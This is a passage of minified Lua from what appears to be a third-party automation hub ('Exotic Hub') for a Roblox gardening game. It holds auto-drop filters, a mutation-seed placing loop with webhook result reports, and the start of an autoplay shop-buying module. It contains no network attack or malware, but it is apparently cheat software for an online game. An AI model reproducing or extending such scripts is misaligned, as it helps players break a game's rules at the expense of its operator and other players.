				Tooltip = "Fruits above this KG will not be dropped.";
				Changed = function(G)
					if j then
						j:SetText(c(G))
					end
				end;
				Callback = function(G)
					local V = f(G)
					if not V or V < ((tonumber(h.auto_drop_min_weight) or 0)) then
						g.Notify("Invalid maximum drop KG", 3)
						j:SetValue(tostring(h.auto_drop_max_weight))
						j:SetText(c(h.auto_drop_max_weight))
						return
					end
					h.auto_drop_max_weight = Z.FruitFilters.RoundWeight(V)
					j:SetText(c(h.auto_drop_max_weight))
					a.Save.SaveDataSync()
				end
			})
			local J
			J = y:AddInput("auto_drop_keep_fruit_ui", {
				Text = "\240\159\148\146 Keep Per Fruit";
				Default = tostring(h.auto_drop_keep_amount_per_fruit);
				Numeric = true,
				AllowEmpty = true;
				Finished = true;
				ClearTextOnFocus = false,
				Placeholder = "Amount to keep";
				Tooltip = "Keeps this many of each fruit name.",
				Callback = function(G)
					local V = z(G)
					if V == nil or V < 0 then
						g.Notify("Keep amount must be 0 or more", 3)
						J:SetValue(tostring(h.auto_drop_keep_amount_per_fruit))
						return
					end
					h.auto_drop_keep_amount_per_fruit = math.clamp(V, 0, 999)
					a.Save.SaveDataSync()
				end
			})
			y:AddToggle("auto_drop_protect_favourites_ui", {
				Text = "\226\173\144 Protect Favourite Fruits";
				Default = h.auto_drop_protect_favourites;
				Tooltip = "Favourite fruits will not be dropped.",
				Callback = function(G)
					h.auto_drop_protect_favourites = G
					a.Save.SaveDataSync()
				end
			})
			local T
			T = y:AddValueDropdown("auto_drop_seed_list_ui", {
				Values = Z.SeedData.GetSeedDataListDropDown(),
				Default = {};
				Multi = true,
				Searchable = true;
				MaxVisibleDropdownItems = 10;
				Text = "\240\159\140\177 Seeds",
				Tooltip = "Only selected seeds can be dropped. Empty allows all seeds.",
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_seed_list = G
					a.Save.SaveDataSync()
				end
			})
			T:SetValue(h.auto_drop_seed_list)
			local d
			d = y:AddValueDropdown("auto_drop_item_names_ui", {
				Values = Z.AutoDropItems.GetCurrentItemDropdownAutoDropItems(),
				Default = {};
				Multi = true,
				Searchable = true;
				MaxVisibleDropdownItems = 10;
				Text = "\240\159\167\176 Other Items";
				Tooltip = "Only selected non-fruit, non-seed, non-pet items can be dropped. Empty allows all selected categories.";
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_item_names = G
					a.Save.SaveDataSync()
				end
			})
			d:SetValue(h.auto_drop_item_names)
			y:AddButton({
				Text = "\226\153\187\239\184\143 Refresh Item List",
				Tooltip = "Refreshes current backpack item names.";
				Func = function()
					if d then
						d:SetValues(Z.AutoDropItems.GetCurrentItemDropdownAutoDropItems())
						d:SetValue(h.auto_drop_item_names, true)
					end
				end
			})
			local u
			u = y:AddValueDropdown("auto_drop_mutation_whitelist_ui", {
				Values = Z.FruitFilters.GetMutationNames(),
				Default = {};
				Multi = true;
				Text = "\226\156\133 Only Fruit Mutations",
				Tooltip = "Only fruits with selected mutations can be dropped. Empty allows all.";
				Searchable = true;
				MaxVisibleDropdownItems = 10;
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_mutation_whitelist = G
					a.Save.SaveDataSync()
				end
			})
			u:SetValue(h.auto_drop_mutation_whitelist)
			local q
			q = y:AddValueDropdown("auto_drop_mutation_blacklist_ui", {
				Values = Z.FruitFilters.GetMutationNames();
				Default = {};
				Multi = true,
				Text = "\226\155\148 Protect Fruit Mutations",
				Tooltip = "Fruits with selected mutations will not be dropped.";
				Searchable = true,
				MaxVisibleDropdownItems = 10,
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_mutation_blacklist = G
					a.Save.SaveDataSync()
				end
			})
			q:SetValue(h.auto_drop_mutation_blacklist)
			local E
			E = y:AddValueDropdown("auto_drop_variant_whitelist_ui", {
				Values = Z.FruitFilters.GetVariantNames(),
				Default = {},
				Multi = true,
				Text = "\226\156\133 Only Fruit Variants";
				Tooltip = "Only selected fruit variants can be dropped. Empty allows all.";
				Searchable = false;
				MaxVisibleDropdownItems = 5,
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_variant_whitelist = G
					a.Save.SaveDataSync()
				end
			})
			E:SetValue(h.auto_drop_variant_whitelist)
			local H
			H = y:AddValueDropdown("auto_drop_variant_blacklist_ui", {
				Values = Z.FruitFilters.GetVariantNames();
				Default = {},
				Multi = true,
				Text = "\226\155\148 Protect Fruit Variants";
				Tooltip = "Selected fruit variants will not be dropped.";
				Searchable = false;
				MaxVisibleDropdownItems = 5,
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_variant_blacklist = G
					a.Save.SaveDataSync()
				end
			})
			H:SetValue(h.auto_drop_variant_blacklist)
			local r
			r = y:AddValueDropdown("auto_drop_pet_selected_ui", {
				Values = Z.PackOpenHelpers.GetPetDropdownPackOpenHelpers();
				Default = {},
				Multi = true;
				Searchable = true;
				MaxVisibleDropdownItems = 10,
				Text = "\240\159\144\190 Pets";
				Tooltip = "Only selected pets can be dropped. Empty allows all pets in selected categories.";
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_pet_selected = G
					a.Save.SaveDataSync()
				end
			})
			r:SetValue(h.auto_drop_pet_selected)
			local Y
			Y = y:AddValueDropdown("auto_drop_pet_protected_ui", {
				Values = Z.PackOpenHelpers.GetPetDropdownPackOpenHelpers(),
				Default = {},
				Multi = true,
				Searchable = true;
				MaxVisibleDropdownItems = 10;
				Text = "\240\159\155\161\239\184\143 Protect Pets",
				Tooltip = "Selected pets will never be dropped.";
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_pet_protected = G
					a.Save.SaveDataSync()
				end
			})
			Y:SetValue(h.auto_drop_pet_protected)
			local e
			e = y:AddInput("auto_drop_pet_keep_amount_ui", {
				Text = "\240\159\148\146 Keep Per Pet",
				Default = tostring(h.auto_drop_pet_keep_amount);
				Numeric = true;
				AllowEmpty = true;
				Finished = true;
				ClearTextOnFocus = false;
				Placeholder = "Amount to keep",
				Tooltip = "Keeps this many of each pet name, size and variant.",
				Callback = function(G)
					local V = z(G)
					if V == nil or V < 0 then
						g.Notify("Pet keep amount must be 0 or more", 3)
						e:SetValue(tostring(h.auto_drop_pet_keep_amount))
						return
					end
					h.auto_drop_pet_keep_amount = math.clamp(V, 0, 999)
					a.Save.SaveDataSync()
				end
			})
			y:AddToggle("auto_drop_pet_protect_equipped_ui", {
				Text = "\240\159\155\161\239\184\143 Protect Equipped Pets";
				Default = h.auto_drop_pet_protect_equipped,
				Tooltip = "Equipped pets will not be dropped.";
				Callback = function(G)
					h.auto_drop_pet_protect_equipped = G
					a.Save.SaveDataSync()
				end
			})
			local s
			s = y:AddValueDropdown("auto_drop_pet_rarity_whitelist_ui", {
				Values = Z.AutoDropItems.GetPetRarityValuesAutoDropItems(),
				Default = {},
				Multi = true;
				Text = "\226\156\133 Only Pet Rarities",
				Tooltip = "Only selected pet rarities can be dropped. Empty allows all.",
				Searchable = true,
				MaxVisibleDropdownItems = 8;
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_pet_rarity_whitelist = G
					a.Save.SaveDataSync()
				end
			})
			s:SetValue(h.auto_drop_pet_rarity_whitelist)
			local N
			N = y:AddValueDropdown("auto_drop_pet_rarity_blacklist_ui", {
				Values = Z.AutoDropItems.GetPetRarityValuesAutoDropItems(),
				Default = {},
				Multi = true,
				Text = "\226\155\148 Protect Pet Rarities";
				Tooltip = "Selected pet rarities will not be dropped.";
				Searchable = true;
				MaxVisibleDropdownItems = 8;
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_pet_rarity_blacklist = G
					a.Save.SaveDataSync()
				end
			})
			N:SetValue(h.auto_drop_pet_rarity_blacklist)
			local W
			W = y:AddValueDropdown("auto_drop_pet_size_whitelist_ui", {
				Values = Z.AutoDropItems.GetPetSizeValuesAutoDropItems(),
				Default = {},
				Multi = true;
				Text = "\226\156\133 Only Pet Sizes";
				Tooltip = "Only selected pet sizes can be dropped. Empty allows all.",
				Searchable = false;
				MaxVisibleDropdownItems = 5;
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_pet_size_whitelist = G
					a.Save.SaveDataSync()
				end
			})
			W:SetValue(h.auto_drop_pet_size_whitelist)
			local X
			X = y:AddValueDropdown("auto_drop_pet_size_blacklist_ui", {
				Values = Z.AutoDropItems.GetPetSizeValuesAutoDropItems(),
				Default = {},
				Multi = true,
				Text = "\226\155\148 Protect Pet Sizes",
				Tooltip = "Selected pet sizes will not be dropped.";
				Searchable = false,
				MaxVisibleDropdownItems = 5;
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_pet_size_blacklist = G
					a.Save.SaveDataSync()
				end
			})
			X:SetValue(h.auto_drop_pet_size_blacklist)
			local l
			l = y:AddValueDropdown("auto_drop_pet_variant_whitelist_ui", {
				Values = Z.AutoDropItems.GetPetVariantValuesAutoDropItems(),
				Default = {},
				Multi = true;
				Text = "\226\156\133 Only Pet Variants";
				Tooltip = "Only selected pet variants can be dropped. Empty allows all.",
				Searchable = false,
				MaxVisibleDropdownItems = 5;
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_pet_variant_whitelist = G
					a.Save.SaveDataSync()
				end
			})
			l:SetValue(h.auto_drop_pet_variant_whitelist)
			local B
			B = y:AddValueDropdown("auto_drop_pet_variant_blacklist_ui", {
				Values = Z.AutoDropItems.GetPetVariantValuesAutoDropItems();
				Default = {},
				Multi = true,
				Text = "\226\155\148 Protect Pet Variants",
				Tooltip = "Selected pet variants will not be dropped.";
				Searchable = false,
				MaxVisibleDropdownItems = 5;
				Changed = function(G)
					if type(G) ~= "table" then
						return
					end
					h.auto_drop_pet_variant_blacklist = G
					a.Save.SaveDataSync()
				end
			})
			B:SetValue(h.auto_drop_pet_variant_blacklist)
		end
		return true
	end
}
g.MutationSeedPlacerStatusText = ""
Z.MutationSeedPlacer = {
	BusyMutationSeedPlacer = false;
	StartedMutationSeedPlacer = false;
	SetStatusMutationSeedPlacer = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.MutationSeedPlacerStatusText = ""
			return false
		end
		g.MutationSeedPlacerStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\167\172 [Mutation Seed]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end;
	GetDropdownMutationSeedPlacer = function(G)
		local V = {}
		for y, j in ipairs(g.AllSeedsDataTable or {}) do
			if type(j) ~= "table" then
				continue
			end
			if G == true and j.mutation_seed ~= true then
				continue
			end
			if G ~= true and j.mutation_seed == true then
				continue
			end
			local i = tostring(j.name or "")
			if i == "" then
				continue
			end
			local c = tostring(j.rarity or "Unknown")
			local J = "Multi"
			if j.single == true then
				J = "Single"
			end
			table.insert(V, {
				Value = i,
				Rank = g.RarityRank[c] or 0;
				Text = string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'%s\'>%s</font> <font color=\'#CFCFCF\'>%s</font>", i, Z.Data.GetRarityColor(c), c, J)
			})
		end
		table.sort(V, function(G, V)
			if ((G.Rank or 0)) ~= ((V.Rank or 0)) then
				return ((G.Rank or 0)) > ((V.Rank or 0))
			end
			return tostring(G.Value or "") < tostring(V.Value or "")
		end)
		return V
	end;
	OnStartMutationSeedPlacer = function()
		if h.mutation_seed_placer_enabled ~= true then
			return false
		end
		Z.MutationSeedPlacer.StartedMutationSeedPlacer = true
		local G = y.PlayerGui
		if not G and y.LocalPlayer then
			G = y.LocalPlayer:FindFirstChild("PlayerGui")
		end
		if not G then
			return false
		end
		local V = G:FindFirstChild("MutationSeedPlacerStopGui")
		if V then
			V:Destroy()
		end
		local j = Instance.new("ScreenGui")
		j.Name = "MutationSeedPlacerStopGui"
		j.ResetOnSpawn = false
		j.IgnoreGuiInset = true
		j.DisplayOrder = 2147483647
		j.Parent = G
		local i = Instance.new("TextButton")
		i.Name = "StopMutationSeedPlacerButton"
		i.AnchorPoint = Vector2.new(.5, 0)
		i.Position = UDim2.fromScale(.5, .18)
		i.Size = UDim2.fromOffset(460, 76)
		i.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
		i.BorderSizePixel = 0
		i.Text = "STOP MUTATION SEED PLACER"
		i.TextColor3 = Color3.fromRGB(255, 255, 255)
		i.TextScaled = true
		i.Font = Enum.Font.GothamBlack
		i.Parent = j
		local c = Instance.new("UICorner")
		c.CornerRadius = UDim.new(0, 12)
		c.Parent = i
		i.MouseButton1Click:Connect(function()
			h.mutation_seed_placer_enabled = false
			Z.MutationSeedPlacer.BusyMutationSeedPlacer = false
			Z.MutationSeedPlacer.StartedMutationSeedPlacer = false
			g.MutationSeedPlacerStatusText = ""
			a.Save.SaveDataSync()
			j:Destroy()
		end)
		return true
	end,
	SendWebhookMutationSeedPlacer = function(G, V, j)
		if h.webhook_enabled ~= true then
			return false
		end
		if G == true and h.mutation_seed_placer_webhook_success ~= true then
			return false
		end
		if G ~= true and h.mutation_seed_placer_webhook_failure ~= true then
			return false
		end
		if not Z.Webhooks or type(Z.Webhooks.Post) ~= "function" or type(Z.Webhooks.IsValidUrl) ~= "function" or not Z.Webhooks.IsValidUrl(h.webhook_url) then
			return false
		end
		local i, c = {}, "Unknown"
		if y.LocalPlayer then
			c = tostring(y.LocalPlayer.Name or "Unknown")
		end
		for G, V in ipairs(V or {}) do
			local y = "\226\157\140"
			if V.keep == true then
				y = "\226\156\133"
			end
			table.insert(i, string.format("%s %d. %s -> %s [%s]", y, G, tostring(V.seed or "?"), tostring(V.plant or V.reason or "Unknown"), tostring(g.SeedRarity[V.plant] or "Unknown")))
		end
		local J, T = "\240\159\167\172 Mutation Seed Failed", 15548997
		if G == true then
			J = "\240\159\167\172 Mutation Seed Success"
			T = 5763719
		end
		local d = table.concat(i, "\n")
		if d == "" then
			d = tostring(j or "No result")
		end
		if # d > 950 then
			d = d:sub(1, 930) .. "\n..."
		end
		local u = {
			username = "Exotic Hub",
			embeds = {
				{
					title = J,
					description = d;
					color = T,
					fields = {
						{
							name = "\240\159\145\164 Account";
							value = "||@" .. (c .. "||"),
							inline = true
						}
					},
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					};
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}
		task.spawn(function()
			Z.Webhooks.Post(u)
		end)
		return true
	end,
	OnSuccessTeleportMutationSeedPlacer = function(G)
		Z.MutationSeedPlacer.SendWebhookMutationSeedPlacer(true, G, "Success")
		Z.MutationSeedPlacer.SetStatusMutationSeedPlacer("Success | wanted plant found", "#7CFC00")
		return true
	end,
	OnFailureTeleportMutationSeedPlacer = function(G, V)
		Z.MutationSeedPlacer.SendWebhookMutationSeedPlacer(false, G, V)
		Z.MutationSeedPlacer.SetStatusMutationSeedPlacer("Failed | " .. tostring(V or "no wanted plant"), "#FFCC66")
		return false
	end,
	RunMutationSeedPlacer = function()
		if type(h.mutation_seed_placer_seed) ~= "table" or next(h.mutation_seed_placer_seed) == nil then
			Z.MutationSeedPlacer.SetStatusMutationSeedPlacer("Select mutation seeds", "#FFCC66")
			return false
		end
		if type(h.mutation_seed_placer_keep_plants) ~= "table" or next(h.mutation_seed_placer_keep_plants) == nil then
			Z.MutationSeedPlacer.SetStatusMutationSeedPlacer("Select plants to keep", "#FFCC66")
			return false
		end
		local function G()
			local G, V = {}, Z.FruitFiltersDataSync
			local y = {}
			if type(V) == "table" and type(V.Plants) == "table" then
				y = V.Plants
			end
			for V, y in pairs(y) do
				if type(y) == "table" and y.Removed ~= true then
					G[tostring(V)] = true
				end
			end
			return G
		end
		local function V(G)
			local V = Z.FruitFiltersDataSync
			for y = 1, 3, 1 do
				task.wait(1)
				local Z = {}
				if type(V) == "table" and type(V.Plants) == "table" then
					Z = V.Plants
				end
				for V, y in pairs(Z) do
					V = tostring(V or "")
					if G[V] ~= true and (type(y) == "table" and y.Removed ~= true) then
						local G = tostring(y.PlantName or y.SeedName or "")
						if G ~= "" then
							return {
								id = V,
								name = G
							}
						end
					end
				end
			end
			return nil
		end
		local function y()
			for G, V in ipairs(Z.MutationSeedPlacer.GetDropdownMutationSeedPlacer(true)) do
				local y = tostring(V.Value or "")
				if h.mutation_seed_placer_seed[y] == true then
					local G, V = Z.Seeder.GetSeedTool(y)
					local j = math.max(tonumber(V) or 0, Z.Seeder.GetInventorySeedCountSeedPlacer(y))
					if G and j > 0 then
						return y, G
					end
				end
			end
			return "", nil
		end
		local j, i, c = {}, false, Z.Seeder.GetOccupiedPositions()
		local J = math.max(math.floor(tonumber(h.mutation_seed_placer_seed_count) or 1), 1)
		local T = math.clamp(tonumber(h.mutation_seed_placer_place_delay) or .1, .001, 3)
		local d, u = nil, false
		for g = 1, J, 1 do
			if h.mutation_seed_placer_enabled ~= true then
				break
			end
			local E, a = y()
			if E == "" or not a then
				Z.ShovelTool.Cleanup(u)
				return Z.MutationSeedPlacer.OnFailureTeleportMutationSeedPlacer(j, "selected seeds are out")
			end
			local H = Z.Seeder.GetGridOpenPositionSeedPlacer(nil, c, true)
			if typeof(H) ~= "Vector3" then
				Z.ShovelTool.Cleanup(u)
				return Z.MutationSeedPlacer.OnFailureTeleportMutationSeedPlacer(j, "no open planting spot")
			end
			if not Z.Player.IsToolHeld(a) and not Z.Player.EquipTool(a) then
				Z.ShovelTool.Cleanup(u)
				return Z.MutationSeedPlacer.OnFailureTeleportMutationSeedPlacer(j, "could not equip seed")
			end
			Z.MutationSeedPlacer.SetStatusMutationSeedPlacer(string.format("Placing %s %d/%d", E, g, J), "#66CCFF")
			local r = G()
			local Y = Z.Seeder.PlaceSeed(E, H, a)
			if Y then
				q.PositionGrid.Add(c, H)
			end
			local e = nil
			if Y then
				e = V(r)
			end
			local s = {
				seed = E,
				plant = "Unknown";
				id = "";
				keep = false
			}
			if e then
				s.plant = e.name
				s.id = e.id
				s.keep = h.mutation_seed_placer_keep_plants[e.name] == true
			end
			table.insert(j, s)
			if s.keep == true then
				i = true
			elseif h.mutation_seed_placer_shovel_failed == true and s.id ~= "" then
				if not d then
					d, u = Z.ShovelTool.Equip()
				end
				if d then
					Z.ShovelTool.Use(s.id, "", d)
				end
			end
			task.wait(T)
		end
		Z.ShovelTool.Cleanup(u)
		if i then
			return Z.MutationSeedPlacer.OnSuccessTeleportMutationSeedPlacer(j)
		end
		return Z.MutationSeedPlacer.OnFailureTeleportMutationSeedPlacer(j, "wanted plant not found")
	end,
	LoopMutationSeedPlacer = function()
		if h.mutation_seed_placer_enabled ~= true then
			g.MutationSeedPlacerStatusText = ""
			Z.MutationSeedPlacer.StartedMutationSeedPlacer = false
			return false
		end
		if Z.MutationSeedPlacer.StartedMutationSeedPlacer ~= true then
			Z.MutationSeedPlacer.OnStartMutationSeedPlacer()
		end
		if Z.MutationSeedPlacer.BusyMutationSeedPlacer then
			return true
		end
		if not q.IsLoadingCompleted() then
			Z.MutationSeedPlacer.SetStatusMutationSeedPlacer("Waiting for loading", "#FFCC66")
			return true
		end
		Z.MutationSeedPlacer.BusyMutationSeedPlacer = true
		local G, V = pcall(Z.MutationSeedPlacer.RunMutationSeedPlacer)
		Z.MutationSeedPlacer.BusyMutationSeedPlacer = false
		if not G then
			Z.MutationSeedPlacer.SetStatusMutationSeedPlacer("System error", "#FF6666")
			warn("[MutationSeedPlacer]", V)
			return false
		end
		return V == true
	end,
	UiMutationSeedPlacer = function(G)
		if not G then
			return false
		end
		G:AddLabel({
			Text = "Places selected mutation seeds, checks each summoned plant, then reports success or failure after all results finish.";
			DoesWrap = true
		})
		local V = G:AddValueDropdown("mutation_seed_placer_seed_ui", {
			Values = Z.MutationSeedPlacer.GetDropdownMutationSeedPlacer(true);
			Default = {};
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\167\172 Mutation Seeds";
			Tooltip = "Selected mutation seed tools are used in rarity order.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.mutation_seed_placer_seed = G
				a.Save.SaveDataSync()
			end
		})
		V:SetValue(h.mutation_seed_placer_seed)
		local j = G:AddValueDropdown("mutation_seed_placer_keep_plants_ui", {
			Values = Z.MutationSeedPlacer.GetDropdownMutationSeedPlacer(false),
			Default = {};
			Multi = true;
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\140\177 Plants To Keep";
			Tooltip = "A run succeeds when any selected plant is summoned.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.mutation_seed_placer_keep_plants = G
				a.Save.SaveDataSync()
			end
		})
		j:SetValue(h.mutation_seed_placer_keep_plants)
		local i
		i = G:AddInput("mutation_seed_placer_seed_count_ui", {
			Text = "\240\159\148\162 Seeds To Place",
			Default = tostring(h.mutation_seed_placer_seed_count),
			Numeric = true;
			AllowEmpty = false;
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "1",
			Tooltip = "Minimum 1. The run waits for each planted result.",
			Callback = function(G)
				local V = z(G)
				if not V or V < 1 then
					g.Notify("Seeds to place must be 1 or higher", 3)
					i:SetValue(tostring(h.mutation_seed_placer_seed_count))
					return
				end
				h.mutation_seed_placer_seed_count = V
				a.Save.SaveDataSync()
			end
		})
		local c
		c = G:AddInput("mutation_seed_placer_place_delay_ui", {
			Text = "\226\154\161 Seed Place Delay";
			Default = tostring(h.mutation_seed_placer_place_delay),
			Numeric = true,
			AllowEmpty = false;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "0.1",
			Tooltip = "Delay between seeds. Min 0.001, max 3 seconds.",
			Callback = function(G)
				local V = tonumber(G)
				if not V or V < .001 or V > 3 then
					g.Notify("Place delay must be 0.001 to 3 seconds", 3)
					c:SetValue(tostring(h.mutation_seed_placer_place_delay))
					return
				end
				h.mutation_seed_placer_place_delay = V
				a.Save.SaveDataSync()
			end
		})
		G:AddToggle("mutation_seed_placer_webhook_success_ui", {
			Text = "\240\159\148\148 Webhook On Success",
			Default = h.mutation_seed_placer_webhook_success;
			Tooltip = "Sends the result list when a wanted plant is found.";
			Callback = function(G)
				h.mutation_seed_placer_webhook_success = G == true
				a.Save.SaveDataSync()
			end
		})
		G:AddToggle("mutation_seed_placer_webhook_failure_ui", {
			Text = "\240\159\148\148 Webhook On Failure",
			Default = h.mutation_seed_placer_webhook_failure;
			Tooltip = "Sends the result list when no wanted plant is found.",
			Callback = function(G)
				h.mutation_seed_placer_webhook_failure = G == true
				a.Save.SaveDataSync()
			end
		})
		G:AddToggle("mutation_seed_placer_shovel_failed_ui", {
			Text = "\240\159\170\147 Shovel Failed Plants",
			Default = h.mutation_seed_placer_shovel_failed,
			Tooltip = "Shovels unwanted plants that do not match your selected keep plants.";
			Callback = function(G)
				h.mutation_seed_placer_shovel_failed = G == true
				a.Save.SaveDataSync()
			end
		})
		G:AddToggle("mutation_seed_placer_enabled_ui", {
			Text = "\240\159\167\172 Enable Mutation Seed Placer";
			Default = h.mutation_seed_placer_enabled,
			Tooltip = "Starts placing selected mutation seeds.",
			Callback = function(G)
				h.mutation_seed_placer_enabled = G == true
				if G == true then
					Z.MutationSeedPlacer.OnStartMutationSeedPlacer()
				else
					Z.MutationSeedPlacer.BusyMutationSeedPlacer = false
					Z.MutationSeedPlacer.StartedMutationSeedPlacer = false
					g.MutationSeedPlacerStatusText = ""
					local G = nil
					if y.PlayerGui then
						G = y.PlayerGui:FindFirstChild("MutationSeedPlacerStopGui")
					end
					if G then
						G:Destroy()
					end
				end
				a.Save.SaveDataSync()
			end
		})
		return true
	end
}
if h.mutation_seed_placer_enabled == true then
	task.spawn(function()
		Z.MutationSeedPlacer.OnStartMutationSeedPlacer()
	end)
end
Z.TotalControl = {
	FreeGardenExpansionsTotalControl = 2,
	FreePetInventoryUpgradesTotalControl = 1;
	PetInventoryMinimumShecklesTotalControl = 90000000,
	LargeGardenPlantThresholdTotalControl = 600,
	IdleSeedPetPriorityTotalControl = {
		"Turkey";
		"Robin"
	};
	IdleUtilityPetPriorityTotalControl = {
		"BlackDragon";
		"GoldenDragonfly",
		"Unicorn"
	},
	IdleCropPetPrioritySmallTotalControl = {
		"Deer";
		"Firefly",
		"Butterfly"
	};
	IdleCropPetPriorityLargeTotalControl = {
		"Firefly";
		"Deer",
		"Butterfly"
	};
	NormalPetBuyAvoidTotalControl = {
		Frog = true,
		Owl = true
	};
	IsEnabledTotalControl = function()
		return h.total_control_enabled == true
	end;
	SetStatusTotalControl = function(G, V)
		G = tostring(G or "")
		X.status = G
		if G == "" then
			g.TotalControlStatusText = ""
			return false
		end
		g.TotalControlStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\167\160 [Total Control]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	ClearStatusTotalControl = function()
		X.status = ""
		g.TotalControlStatusText = ""
		return true
	end;
	SetEnabledTotalControl = function(G)
		local V = G == true
		X.enabled = V
		if h.total_control_enabled ~= V then
			h.total_control_enabled = V
			a.Save.SaveDataSync()
		end
		if V then
			Z.TotalControl.SetStatusTotalControl("Planning next action", "#FFCC66")
		else
			Z.TotalControl.ClearStatusTotalControl()
		end
		return V
	end,
	ResolveShopTriggerActiveTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		G = tostring(G or "")
		if G == "seed_shop" or G == "gear_shop" then
			return true
		end
		return nil
	end,
	ResolveSpendableShecklesTotalControl = function(G, V)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		G = tostring(G or "")
		if G == "seed_shop" or G == "gear_shop" then
			return math.max(tonumber(V) or 0, 0)
		end
		if G == "crate_shop" then
			return 0
		end
		return nil
	end,
	ResolveSeedShopEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end,
	ResolveSeedShopNamesTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		local G = {}
		local V = y.SeedShop and y.SeedShop.Items
		if V then
			for V, y in ipairs(V:GetChildren()) do
				local j = tostring(y.Name or "")
				if j ~= "" and Z.SeedData.GetSeedDataX(j) then
					table.insert(G, j)
				end
			end
		end
		table.sort(G, function(G, V)
			local y = Z.SeedData.GetSeedDataX(G)
			local j = Z.SeedData.GetSeedDataX(V)
			local i = type(y) == "table" and tonumber(y.price) or 0
			local c = type(j) == "table" and tonumber(j.price) or 0
			if i ~= c then
				return i > c
			end
			return tostring(G) < tostring(V)
		end)
		return G
	end,
	ResolveSeedShopSelectionTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		G = tostring(G or "")
		return G ~= "" and Z.SeedData.GetSeedDataX(G) ~= nil
	end,
	ResolveSeedShopBuyLimitTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		G = tostring(G or "")
		local V = l.total_control_seed_buy_limits
		if type(V) ~= "table" then
			return nil
		end
		local y = V[G]
		if y == nil or type(y) == "string" and string.lower(y) == "all" then
			return nil
		end
		y = tonumber(y)
		if y == nil then
			return nil
		end
		return math.max(math.floor(y), 0)
	end;
	ResolveGearShopEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end;
	IsLegendaryOrLowerSprinklerTotalControl = function(G, V)
		G = tostring(G or "")
		V = type(V) == "table" and V or g.AllGearShopData[G]
		local y = type(V) == "table" and tostring(V.type or "") or ""
		local Z = string.lower(G .. (" " .. y))
		if Z:find("sprinkler", 1, true) == nil then
			return false
		end
		local j = g.RarityRank[tostring(type(V) == "table" and V.rarity or "")] or 0
		return j > 0 and j <= ((g.RarityRank.Legendary or 5))
	end;
	IsGearNameInGameDataTotalControl = function(G, V, y)
		G = tostring(G or "")
		if G == "" or type(V) ~= "table" then
			return false
		end
		for V, Z in ipairs(V) do
			if type(Z) == "table" and tostring(Z[y] or "") == G then
				return true
			end
		end
		return false
	end;
	IsUsefulGearTotalControl = function(G, V)
		G = tostring(G or "")
		V = type(V) == "table" and V or g.AllGearShopData[G]
		if G == "" or type(V) ~= "table" then
			return false
		end
		if G == "Basic Pot" or G == "Trowel" then
			return true
		end
		local j = g.RarityRank[tostring(V.rarity or "")] or 0
		if j >= ((g.RarityRank.Super or 7)) then
			return true
		end
		if Z.TotalControl.IsGearNameInGameDataTotalControl(G, y.SprinklerData, "SprinklerName") then
			return true
		end
		return Z.TotalControl.IsGearNameInGameDataTotalControl(G, y.WateringcanData, "Name")
	end,
	GetGearShopPriorityTotalControl = function(G, V)
		G = tostring(G or "")
		V = type(V) == "table" and V or g.AllGearShopData[G]
		if G == "Super Sprinkler" then
			return 1
		end
		if G == "Super Watering Can" then
			return 2
		end
		if G == "Basic Pot" then
			return 3
		end
		if G == "Trowel" then
			return 4
		end
		local y = g.RarityRank[tostring(type(V) == "table" and V.rarity or "")] or 0
		if y >= ((g.RarityRank.Super or 7)) then
			return 5
		end
		if Z.TotalControl.IsUsefulGearTotalControl(G, V) then
			return 6
		end
		return 7
	end;
	GetOwnedGearCountTotalControl = function(G)
		G = tostring(G or "")
		if G == "" then
			return 0
		end
		local V = 0
		for y, Z in ipairs(Z.Backpack.GetBackpackAllItems()) do
			if not Z:IsA("Tool") then
				continue
			end
			local j = tostring(Z.Name or "") == G
			if not j then
				for V, y in pairs(Z:GetAttributes()) do
					if type(y) == "string" and y == G then
						j = true
						break
					end
				end
			end
			if j then
				local G = tonumber(Z:GetAttribute("Count") or Z:GetAttribute("Amount") or Z:GetAttribute("Quantity"))
				if G == nil then
